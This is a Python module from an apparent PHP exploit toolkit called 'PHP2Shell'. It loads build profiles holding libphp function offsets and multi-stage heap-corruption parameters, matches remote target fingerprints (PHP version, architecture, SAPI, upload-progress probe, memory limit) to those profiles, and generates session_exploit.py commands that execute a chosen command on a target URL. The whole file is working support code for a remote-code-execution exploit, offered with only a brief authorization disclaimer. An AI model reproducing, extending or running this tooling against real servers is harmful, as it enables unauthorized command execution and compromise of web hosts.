#!/usr/bin/env python3
"""PHP2Shell build-profile DB, command generation and fingerprint matching.

A profile is a per-build record:

  name, php_version, arch, distro, image, libphp offsets,
  stage 1/2/3 heap parameters, OOM margin, verified/rce status.

Profiles loaded from ``profiles/catalog.json`` and from individual
``profiles/*.json`` files (so ``calibrate_session.py --out profiles/foo.json``
can extend the set without editing the catalog).

Unauthorized use is prohibited; these profiles are for owned or explicitly
authorized targets.
"""
from __future__ import annotations

import json
import os
import sys
from pathlib import Path
from typing import Any, Iterable

ROOT = Path(__file__).resolve().parent
PROFILE_DIR = ROOT / "profiles"
CATALOG = PROFILE_DIR / "catalog.json"

ARCH_ALIASES = {
    "amd64": "x86_64",
    "x86_64": "x86_64",
    "x64": "x86_64",
    "aarch64": "aarch64",
    "arm64": "aarch64",
}
HEX_FIELDS = ("zif_system", "zval_ptr_dtor", "htdata")


def normalize_arch(arch: str | None) -> str | None:
    if not arch:
        return None
    text = str(arch).lower()
    if text in ("", "auto", "unknown"):
        return None
    return ARCH_ALIASES.get(text, text)


def _int(value: Any) -> int | None:
    if value is None or value == "":
        return None
    if isinstance(value, int):
        return value
    text = str(value).strip()
    return int(text, 0)


def _normalize_profile(raw: dict[str, Any], source: str) -> dict[str, Any]:
    p = dict(raw)
    p.setdefault("source", source)
    p["arch"] = normalize_arch(p.get("arch")) or "unknown"
    p["sapi"] = p.get("sapi") or "apache2handler"
    p["distro"] = (p.get("distro") or "unknown").lower()

    lib = dict(p.get("libphp") or {})
    for key in HEX_FIELDS:
        if key in lib:
            lib[key] = _int(lib[key])
    p["libphp"] = lib

    stages = dict(p.get("stages") or {})
    for key in ("stage1_n", "stage1_forge_len", "stage2_t", "stage2_v"):
        if stages.get(key) is not None:
            stages[key] = int(stages[key])
    if stages.get("stage3_pads") is not None:
        stages["stage3_pads"] = [list(x) for x in stages["stage3_pads"]]
    p["stages"] = stages

    config = dict(p.get("config") or {})
    for key in ("memory_limit", "oom_mb", "oom_margin_mb", "workers",
                "max_input_vars", "post_max_size"):
        if config.get(key) is not None:
            config[key] = int(config[key])
    if isinstance(config.get("memory_limit_tested_mb"), list):
        config["memory_limit_tested_mb"] = [
            int(x) for x in config["memory_limit_tested_mb"]]
    # Older public profiles kept these at the top level.
    for key in ("oom_mb", "oom_margin_mb", "memory_limit_tested_mb"):
        if key in p and key not in config:
            config[key] = p[key]
    p["config"] = config
    if p.get("oom_mb") is None and config.get("oom_mb") is not None:
        p["oom_mb"] = config["oom_mb"]

    p["verified"] = bool(p.get("verified"))
    p["rce"] = bool(p.get("rce"))
    p["name"] = p.get("name") or "unnamed"
    return p


def _load_entries(path: Path) -> list[dict[str, Any]]:
    try:
        data = json.loads(path.read_text(encoding="utf-8"))
    except (OSError, ValueError):
        return []
    if isinstance(data, list):
        return [x for x in data if isinstance(x, dict)]
    if isinstance(data, dict) and isinstance(data.get("profiles"), list):
        return [x for x in data["profiles"] if isinstance(x, dict)]
    if isinstance(data, dict) and data.get("name"):
        return [data]
    return []


def list_profiles() -> list[dict[str, Any]]:
    """Load catalog and individual profiles, individual files overriding."""
    by_name: dict[str, dict[str, Any]] = {}
    if CATALOG.exists():
        for raw in _load_entries(CATALOG):
            p = _normalize_profile(raw, str(CATALOG))
            by_name[p["name"]] = p
    for path in sorted(PROFILE_DIR.glob("*.json")):
        if path.name in {"catalog.json", "schema.json"}:
            continue
        for raw in _load_entries(path):
            p = _normalize_profile(raw, str(path))
            by_name[p["name"]] = p
    return sorted(by_name.values(), key=lambda p: (p["php_version"], p["arch"], p["name"]))


def load_profile(name_or_path: str) -> dict[str, Any]:
    path = Path(name_or_path).expanduser()
    if path.is_file():
        entries = _load_entries(path)
        if len(entries) == 1:
            return _normalize_profile(entries[0], str(path))
        # A catalog file addressed directly: pick by basename stem.
        matches = [p for p in (_normalize_profile(x, str(path)) for x in entries)
                   if p["name"] == path.stem]
        if len(matches) == 1:
            return matches[0]
        raise ValueError(f"profile file {path} contains multiple entries; select by name")
    wanted = name_or_path.removesuffix(".json")
    for p in list_profiles():
        if p["name"] == wanted:
            return p
    raise ValueError(f"unknown profile {name_or_path!r}; use --list-profiles")


def profile_requirements_ok(profile: dict[str, Any]) -> tuple[bool, list[str]]:
    """Return whether this profile has the fields needed for the RCE chain."""
    problems: list[str] = []
    if not profile.get("rce"):
        problems.append("profile is not marked rce=true")
    lib = profile.get("libphp") or {}
    for key in HEX_FIELDS:
        if not lib.get(key):
            problems.append(f"missing libphp.{key}")
    stages = profile.get("stages") or {}
    for key in ("stage1_n", "stage1_forge_len", "stage2_t", "stage2_v"):
        if not stages.get(key):
            problems.append(f"missing stages.{key}")
    if stages.get("stage3_carrier") is None:
        problems.append("missing stages.stage3_carrier")
    if stages.get("stage3_carrier") and not stages.get("stage3_pads"):
        problems.append("missing stages.stage3_pads")
    return not problems, problems


def profile_exploit_defaults(profile: dict[str, Any]) -> dict[str, Any]:
    ok, problems = profile_requirements_ok(profile)
    if not ok:
        raise ValueError("; ".join(problems))
    stages = profile["stages"]
    lib = profile["libphp"]
    cfg = profile.get("config") or {}
    return {
        "zif_offset": int(lib["zif_system"]),
        "dtor_offset": int(lib["zval_ptr_dtor"]),
        "htdata_offset": int(lib["htdata"]),
        "stage1_n": int(stages["stage1_n"]),
        "stage1_forge_len": int(stages["stage1_forge_len"]),
        "stage2_t": int(stages["stage2_t"]),
        "stage2_v": int(stages["stage2_v"]),
        "stage3_pads": [list(x) for x in (stages.get("stage3_pads") or [])],
        "carrier": bool(stages.get("stage3_carrier")),
        "huge_mb": int(profile.get("oom_mb") or cfg.get("oom_mb") or 12),
    }


def recommended_huge_mb(profile: dict[str, Any],
                        memory_limit_bytes: int | None) -> int:
    base = int(profile.get("oom_mb") or
               (profile.get("config") or {}).get("oom_mb") or 12)
    if not memory_limit_bytes or memory_limit_bytes <= 0:
        return base
    limit_mb = (memory_limit_bytes + (1 << 20) - 1) >> 20
    if base > limit_mb:
        return base
    margin = int(profile.get("oom_margin_mb") or
                 (profile.get("config") or {}).get("oom_margin_mb") or 12)
    return limit_mb + margin


def profile_command(profile: dict[str, Any], url: str, cmd: str,
                    proof_file: str, python: str | None = None,
                    huge_mb: int | None = None) -> list[str]:
    """Build a reproducible session_exploit.py command for a profile."""
    ok, problems = profile_requirements_ok(profile)
    if not ok:
        raise ValueError("; ".join(problems))
    argv = [
        python or sys.executable,
        str(ROOT / "session_exploit.py"),
        "-u", url,
        "-c", cmd,
        "--proof-file", proof_file,
        "--profile", profile["name"],
        "--rotate",
    ]
    if huge_mb is not None:
        argv += ["--huge-mb", str(huge_mb)]
    return argv


def _version_tuple(version: str | None) -> tuple[int, ...]:
    if not version:
        return ()
    out = []
    for part in version.split("."):
        try:
            out.append(int(part))
        except ValueError:
            return ()
    return tuple(out)


def _fixed_version(profile: dict[str, Any]) -> str | None:
    fixed = profile.get("fixed_in")
    return fixed if isinstance(fixed, str) else None


def match_profiles(fingerprint: dict[str, Any],
                   arch: str | None = None,
                   require_rce: bool = False,
                   limit: int = 8) -> list[dict[str, Any]]:
    """Rank profiles against a fingerprint record.

    Unknown fields are not treated as mismatches.  A known arch mismatch or a
    confirmed-negative upload-progress probe excludes the profile from the
    recommended set (it remains in the output with warnings).
    """
    fp = dict(fingerprint)
    target_php = fp.get("php_version")
    target_arch = normalize_arch(arch or fp.get("arch"))
    target_distro = (fp.get("distro") or "").lower()
    upload = fp.get("session_upload_progress")
    mem = fp.get("memory_limit")
    workers = fp.get("workers")

    ranked: list[dict[str, Any]] = []
    for p in list_profiles():
        score = 0
        reasons: list[str] = []
        warnings: list[str] = []
        compatible = True

        if target_php:
            if target_php == p.get("php_version"):
                score += 100
                reasons.append("exact PHP version")
            else:
                compatible = False
                if _version_tuple(target_php)[:2] == _version_tuple(p.get("php_version"))[:2]:
                    score += 20
                    reasons.append("same PHP branch")
                else:
                    score -= 40
                warnings.append("PHP version differs from profile")
        else:
            compatible = False
            warnings.append("PHP version unknown; provide --php-version")

        if target_arch:
            if target_arch == p.get("arch"):
                score += 20
                reasons.append("architecture match")
            else:
                score -= 100
                compatible = False
                warnings.append(f"arch {target_arch} != profile {p.get('arch')}")

        if target_distro and p.get("distro") not in ("unknown", ""):
            if target_distro == p["distro"] or target_distro in p["distro"]:
                score += 8
                reasons.append("distro match")
            else:
                compatible = False
                warnings.append(f"distro {target_distro} != {p['distro']}")

        sapi_hint = (fp.get("sapi_hint") or "").lower()
        if "apache" in sapi_hint:
            score += 8
            reasons.append("Apache SAPI hint")
        elif sapi_hint in ("nginx", "fpm", "cgi", "cli", "cli-server"):
            score -= 40
            compatible = False
            warnings.append(f"SAPI hint {sapi_hint} is not mod_php")

        if upload is True:
            score += 5
            reasons.append("upload_progress probe positive")
        elif upload is False:
            score -= 100
            compatible = False
            warnings.append("upload_progress probe negative")

        if p.get("rce"):
            score += 5
            reasons.append("RCE profile")
            if not profile_requirements_ok(p)[0]:
                compatible = False
                warnings.append("RCE profile is incomplete")
        else:
            if require_rce:
                score -= 100
                compatible = False
            warnings.append("no verified RCE for this profile")

        if mem and p.get("oom_mb"):
            limit_mb = (int(mem) + (1 << 20) - 1) >> 20
            tested = (p.get("config") or {}).get("memory_limit_tested_mb") or []
            if int(p["oom_mb"]) > limit_mb:
                score += 5
                reasons.append("OOM body exceeds memory_limit")
            elif limit_mb in tested:
                score += 5
                reasons.append(f"this profile was tested at {limit_mb} MiB")
            else:
                compatible = False
                warnings.append(
                    f"OOM body {p['oom_mb']} MiB is not above memory_limit {limit_mb} MiB; "
                    "increase --huge-mb or use a profile tested at that limit")
                score -= 20

        if workers is not None and p.get("config", {}).get("workers") is not None:
            pw = int(p["config"]["workers"])
            if int(workers) == pw:
                score += 3
            else:
                compatible = False
                warnings.append(
                    f"profile expects {pw} worker(s), target has {workers}; "
                    "this port does not pin workers")

        fixed = _fixed_version(p)
        if fixed and target_php and _version_tuple(target_php) >= _version_tuple(fixed):
            compatible = False
            warnings.append(f"target version is at/after fixed release {fixed}")

        result = dict(p)
        result["score"] = score
        result["reasons"] = reasons
        result["warnings"] = warnings
        result["compatible"] = compatible
        result["recommended_huge_mb"] = recommended_huge_mb(
            p, int(mem) if mem else None)
        ranked.append(result)

    ranked.sort(key=lambda x: (x["compatible"], x["score"], x["rce"],
                               x["verified"], x["php_version"]), reverse=True)
    return ranked[:limit]


def priority_candidates(fingerprint: dict[str, Any],
                        arch: str | None = None,
                        limit: int | None = None) -> list[dict[str, Any]]:
    """Order runnable profiles when exact build/arch facts are incomplete.

    The order is deliberately conservative:

      1. exact PHP version, matching architecture when known
      2. exact PHP version, other architecture only when arch is unknown
      3. same PHP branch
      4. other verified RCE builds

    Unknown architecture prefers x86_64, the common lab/server case.  Patched
    versions, non-Apache SAPI hints, a negative upload-progress probe and known
    multi-worker targets are excluded.  Callers may still force a profile.
    """
    fp = dict(fingerprint)
    target_php = fp.get("php_version")
    target_arch = normalize_arch(arch or fp.get("arch"))
    target_distro = (fp.get("distro") or "").lower()
    sapi_hint = (fp.get("sapi_hint") or "").lower()
    if sapi_hint in ("nginx", "litespeed", "iis", "cli-server"):
        return []
    if fp.get("session_upload_progress") is False:
        return []
    workers = fp.get("workers")
    if workers is not None and int(workers) != 1:
        return []

    matches = match_profiles(fp, arch=target_arch, require_rce=True,
                             limit=1000)
    candidates: list[dict[str, Any]] = []
    for m in matches:
        if not m.get("rce"):
            continue
        if not profile_requirements_ok(m)[0]:
            continue
        if target_arch and m.get("arch") != target_arch:
            continue
        fixed = _fixed_version(m)
        if target_php and fixed and _version_tuple(target_php) >= _version_tuple(fixed):
            continue
        candidates.append(m)

    def key(m: dict[str, Any]):
        exact = 0 if target_php and m.get("php_version") == target_php else 1
        same_branch = 0 if (target_php and
                             _version_tuple(target_php)[:2] ==
                             _version_tuple(m.get("php_version"))[:2]) else 1
        if target_arch:
            arch_rank = 0 if m.get("arch") == target_arch else 1
        else:
            arch_rank = 0 if m.get("arch") == "x86_64" else 1
        distro_rank = 0 if (target_distro and
                            m.get("distro") == target_distro) else 1
        version_desc = tuple(-x for x in _version_tuple(m.get("php_version")))
        return (exact, same_branch, arch_rank, distro_rank,
                0 if m.get("compatible") else 1,
                version_desc, 0 if m.get("verified") else 1,
                0 if m.get("rce") else 1)

    candidates.sort(key=key)
    return candidates[:limit] if limit is not None else candidates


def format_profile_table(profiles: Iterable[dict[str, Any]]) -> str:
    rows = ["name\tphp\tarch\tdistro\tRCE\tstatus"]
    for p in profiles:
        rows.append("\t".join([
            p["name"], p.get("php_version", "?"), p.get("arch", "?"),
            p.get("distro", "?"), "yes" if p.get("rce") else "no",
            p.get("status", ""),
        ]))
    return "\n".join(rows)


if __name__ == "__main__":
    import argparse
    ap = argparse.ArgumentParser(description="List PHP2Shell build profiles")
    ap.add_argument("--json", action="store_true")
    args = ap.parse_args()
    ps = list_profiles()
    if args.json:
        print(json.dumps(ps, indent=2))
    else:
        print(format_profile_table(ps))
